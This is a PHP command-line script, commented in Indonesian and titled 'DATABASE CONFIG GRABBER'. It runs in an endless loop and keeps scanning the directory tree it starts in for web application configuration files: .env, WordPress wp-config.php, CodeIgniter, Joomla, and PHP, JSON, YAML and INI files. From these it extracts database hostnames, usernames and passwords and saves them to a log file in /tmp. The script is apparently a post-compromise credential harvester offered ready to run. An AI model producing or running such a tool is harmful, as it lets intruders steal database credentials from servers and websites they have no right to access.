#!/usr/bin/php
<?php
// Simpan sebagai: db_grab.php
// Jalankan: php db_grab.php
// Tools ini akan jalan terus dan nyimpen konfigurasi database realtime

// Set waktu Indonesia
date_default_timezone_set('Asia/Jakarta');

// File output utama
$output_file = "/tmp/db_config_".date('Y-m-d').".log";

// Banner
echo "\033[36m";
echo "╔══════════════════════════════════════════════════════════╗\n";
echo "║         DATABASE CONFIG GRABBER - REAL TIME             ║\n";
echo "║              Jalan Terus - Auto Save                    ║\n";
echo "╚══════════════════════════════════════════════════════════╝\n";
echo "\033[0m\n";

echo "\033[33mMulai: ".date('Y-m-d H:i:s')."\033[0m\n";
echo "\033[32mOutput file: $output_file\033[0m\n";
echo "\033[33mTools akan jalan terus, Ctrl+C untuk stop\033[0m\n";
echo str_repeat("=", 60)."\n";

// Buat file header
$header = "=== DB CONFIG GRABBER - ".date('Y-m-d H:i:s')." ===\n";
$header .= "Scan dari: ".getcwd()."\n";
$header .= str_repeat("=", 60)."\n\n";
file_put_contents($output_file, $header, FILE_APPEND);

$sudah_ditemukan = [];

// Loop forever
while(true) {
    $start_dir = getcwd();
    $waktu = date('Y-m-d H:i:s');
    $ditemukan_baru = false;
    
    // 1. Scan file .env
    $files = shell_exec("find $start_dir -name '.env' -type f 2>/dev/null");
    foreach(explode("\n", trim($files)) as $file) {
        if(!$file) continue;
        
        $key = md5($file.filemtime($file));
        if(!in_array($key, $sudah_ditemukan)) {
            $sudah_ditemukan[] = $key;
            $ditemukan_baru = true;
            
            $content = file_get_contents($file);
            $db_lines = [];
            foreach(explode("\n", $content) as $line) {
                if(preg_match('/^(DB_|DATABASE)/', trim($line)) && strpos($line, '#') !== 0) {
                    $db_lines[] = trim($line);
                }
            }
            
            if(!empty($db_lines)) {
                $log = "\n[".date('H:i:s')."] ENV DITEMUKAN: $file\n";
                $log .= "----------------------------------------\n";
                $log .= implode("\n", $db_lines)."\n";
                $log .= "----------------------------------------\n";
                
                echo "\033[32m$log\033[0m";
                file_put_contents($output_file, $log, FILE_APPEND);
            }
        }
    }
    
    // 2. Scan wp-config.php
    $files = shell_exec("find $start_dir -name 'wp-config.php' -type f 2>/dev/null");
    foreach(explode("\n", trim($files)) as $file) {
        if(!$file) continue;
        
        $key = md5($file.filemtime($file));
        if(!in_array($key, $sudah_ditemukan)) {
            $sudah_ditemukan[] = $key;
            $ditemukan_baru = true;
            
            $content = file_get_contents($file);
            preg_match_all('/define\([\'"]?(DB_NAME|DB_USER|DB_PASSWORD|DB_HOST)[\'"]?,\s*[\'"]([^\'"]+)[\'"]\)/', $content, $matches);
            
            if(!empty($matches[0])) {
                $log = "\n[".date('H:i:s')."] WORDPRESS DITEMUKAN: $file\n";
                $log .= "----------------------------------------\n";
                for($i=0; $i<count($matches[1]); $i++) {
                    $log .= $matches[1][$i]." = ".$matches[2][$i]."\n";
                }
                $log .= "----------------------------------------\n";
                
                echo "\033[32m$log\033[0m";
                file_put_contents($output_file, $log, FILE_APPEND);
            }
        }
    }
    
    // 3. Scan database.php (CodeIgniter)
    $files = shell_exec("find $start_dir -name 'database.php' -type f 2>/dev/null");
    foreach(explode("\n", trim($files)) as $file) {
        if(!$file) continue;
        
        $key = md5($file.filemtime($file));
        if(!in_array($key, $sudah_ditemukan)) {
            $sudah_ditemukan[] = $key;
            $ditemukan_baru = true;
            
            $content = file_get_contents($file);
            preg_match_all('/[\'"]?(hostname|username|password|database)[\'"]?\s*=>\s*[\'"]([^\'"]+)[\'"]/', $content, $matches);
            
            if(!empty($matches[0])) {
                $log = "\n[".date('H:i:s')."] CODEIGNITER DITEMUKAN: $file\n";
                $log .= "----------------------------------------\n";
                for($i=0; $i<count($matches[1]); $i++) {
                    $log .= $matches[1][$i]." = ".$matches[2][$i]."\n";
                }
                $log .= "----------------------------------------\n";
                
                echo "\033[32m$log\033[0m";
                file_put_contents($output_file, $log, FILE_APPEND);
            }
        }
    }
    
    // 4. Scan configuration.php (Joomla)
    $files = shell_exec("find $start_dir -name 'configuration.php' -type f 2>/dev/null");
    foreach(explode("\n", trim($files)) as $file) {
        if(!$file) continue;
        
        $key = md5($file.filemtime($file));
        if(!in_array($key, $sudah_ditemukan)) {
            $sudah_ditemukan[] = $key;
            $ditemukan_baru = true;
            
            $content = file_get_contents($file);
            preg_match_all('/public\s+\$(host|user|password|db)\s*=\s*[\'"]([^\'"]+)[\'"]/', $content, $matches);
            
            if(!empty($matches[0])) {
                $log = "\n[".date('H:i:s')."] JOOMLA DITEMUKAN: $file\n";
                $log .= "----------------------------------------\n";
                for($i=0; $i<count($matches[1]); $i++) {
                    $log .= $matches[1][$i]." = ".$matches[2][$i]."\n";
                }
                $log .= "----------------------------------------\n";
                
                echo "\033[32m$log\033[0m";
                file_put_contents($output_file, $log, FILE_APPEND);
            }
        }
    }
    
    // 5. Scan semua file PHP yang mungkin mengandung konfigurasi DB
    $files = shell_exec("find $start_dir -name '*.php' -type f 2>/dev/null | xargs grep -l -E 'mysql_connect|mysqli_connect|new PDO|database.*=' 2>/dev/null | head -50");
    foreach(explode("\n", trim($files)) as $file) {
        if(!$file) continue;
        
        $key = md5($file.filemtime($file));
        if(!in_array($key, $sudah_ditemukan)) {
            $sudah_ditemukan[] = $key;
            $ditemukan_baru = true;
            
            $content = file_get_contents($file);
            $lines = explode("\n", $content);
            $db_lines = [];
            
            foreach($lines as $line) {
                if(preg_match('/(mysql_connect|mysqli_connect|new PDO|database|host|username|password.*=)/i', $line)) {
                    if(strpos($line, '//') === false && strpos($line, '#') === false) {
                        $db_lines[] = trim($line);
                    }
                }
                if(count($db_lines) >= 15) break;
            }
            
            if(!empty($db_lines)) {
                $log = "\n[".date('H:i:s')."] PHP DB CONFIG DITEMUKAN: $file\n";
                $log .= "----------------------------------------\n";
                $log .= implode("\n", $db_lines)."\n";
                $log .= "----------------------------------------\n";
                
                echo "\033[35m$log\033[0m";
                file_put_contents($output_file, $log, FILE_APPEND);
            }
        }
    }
    
    // 6. Scan file .json yang mungkin berisi konfigurasi DB
    $files = shell_exec("find $start_dir -name '*.json' -type f 2>/dev/null | xargs grep -l -E '\"host\"|\"database\"|\"username\"|\"password\"' 2>/dev/null | head -20");
    foreach(explode("\n", trim($files)) as $file) {
        if(!$file) continue;
        
        $key = md5($file.filemtime($file));
        if(!in_array($key, $sudah_ditemukan)) {
            $sudah_ditemukan[] = $key;
            $ditemukan_baru = true;
            
            $content = file_get_contents($file);
            $log = "\n[".date('H:i:s')."] JSON CONFIG DITEMUKAN: $file\n";
            $log .= "----------------------------------------\n";
            
            // Ambil lines yang mengandung keyword DB
            $lines = explode("\n", $content);
            foreach($lines as $line) {
                if(preg_match('/\"(host|database|username|password|connection)\"/i', $line)) {
                    $log .= trim($line)."\n";
                }
            }
            $log .= "----------------------------------------\n";
            
            echo "\033[36m$log\033[0m";
            file_put_contents($output_file, $log, FILE_APPEND);
        }
    }
    
    // 7. Scan file .yml .yaml
    $files = shell_exec("find $start_dir -name '*.yml' -o -name '*.yaml' -type f 2>/dev/null | xargs grep -l -E 'host:|database:|username:|password:' 2>/dev/null | head -20");
    foreach(explode("\n", trim($files)) as $file) {
        if(!$file) continue;
        
        $key = md5($file.filemtime($file));
        if(!in_array($key, $sudah_ditemukan)) {
            $sudah_ditemukan[] = $key;
            $ditemukan_baru = true;
            
            $content = file_get_contents($file);
            $log = "\n[".date('H:i:s')."] YAML CONFIG DITEMUKAN: $file\n";
            $log .= "----------------------------------------\n";
            
            $lines = explode("\n", $content);
            foreach($lines as $line) {
                if(preg_match('/(host|database|username|password|dsn):/i', $line)) {
                    $log .= trim($line)."\n";
                }
            }
            $log .= "----------------------------------------\n";
            
            echo "\033[33m$log\033[0m";
            file_put_contents($output_file, $log, FILE_APPEND);
        }
    }
    
    // 8. Scan file .ini .conf .cnf
    $files = shell_exec("find $start_dir -name '*.ini' -o -name '*.conf' -o -name '*.cnf' -type f 2>/dev/null | xargs grep -l -E 'host|user|password|database' 2>/dev/null | head -20");
    foreach(explode("\n", trim($files)) as $file) {
        if(!$file) continue;
        
        $key = md5($file.filemtime($file));
        if(!in_array($key, $sudah_ditemukan)) {
            $sudah_ditemukan[] = $key;
            $ditemukan_baru = true;
            
            $content = file_get_contents($file);
            $log = "\n[".date('H:i:s')."] INI CONFIG DITEMUKAN: $file\n";
            $log .= "----------------------------------------\n";
            
            $lines = explode("\n", $content);
            foreach($lines as $line) {
                if(preg_match('/(host|user|password|database)/i', $line) && strpos($line, ';') !== 0) {
                    $log .= trim($line)."\n";
                }
            }
            $log .= "----------------------------------------\n";
            
            echo "\033[34m$log\033[0m";
            file_put_contents($output_file, $log, FILE_APPEND);
        }
    }
    
    // Tampilkan status setiap 30 detik kalau gak ada yang baru
    if(!$ditemukan_baru) {
        echo "\033[90m[".date('H:i:s')."] Monitoring... (Belum ada konfigurasi baru)\033[0m\n";
    }
    
    // Simpan daftar yang udah ditemukan biar gak kebanyakan
    if(count($sudah_ditemukan) > 1000) {
        $sudah_ditemukan = array_slice($sudah_ditemukan, -500);
    }
    
    // Delay 10 detik sebelum scan ulang
    sleep(10);
}
?>
